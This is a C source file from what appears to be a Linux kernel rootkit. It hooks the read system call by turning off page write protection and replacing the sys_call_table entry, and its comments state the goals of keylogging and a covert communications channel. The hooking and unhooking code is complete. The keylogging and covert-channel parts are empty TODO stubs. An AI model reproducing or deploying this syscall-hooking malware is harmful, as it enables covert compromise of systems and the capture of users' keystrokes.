/*
 * This file contains all necessary functions for hooking and manipulating
 * the read system call. It is used as a covert communications channel as well
 * as for keylogging.
 */
#include <linux/delay.h>
#include <linux/unistd.h>

#include "include.h"

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

/*
 * call counter to ensure that we are not unhooking the
 * read syste call while it is still in use
 */
static int read_call_counter = 0;

/*
 * Our manipulated read syscall. It will log keystrokes and serve as a covert
 * communication channel.
 */
asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
	read_call_counter++;
	/* nothing else above this line */
	
	long ret;
	ret = original_read(fd, buf, count);

	// TODO: implement keylogging

	// TODO: implement covert communication channel

	/* nothing else below this line */
	read_call_counter--;
	return ret;
}

/* hooks the read system call */
void hook_read(void)
{
	void **sys_call_table = (void *) sysmap_sys_call_table;

	/* disable write protection */
	disable_page_protection();

	/* replace the read syscall */
	original_read = (void *) sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *) manipulated_read;

	/* reenable write protection */
	enable_page_protection();
}

/* unhooks read and returns the kernel to its regular state */
void unhook_read(void)
{
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* ensure that all processes have left our manipulated syscall */
	while(read_call_counter > 0) {
		msleep(10);
	}
	
	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_read] = (unsigned long *) original_read;

	/* reenable write protection */
	enable_page_protection();
}
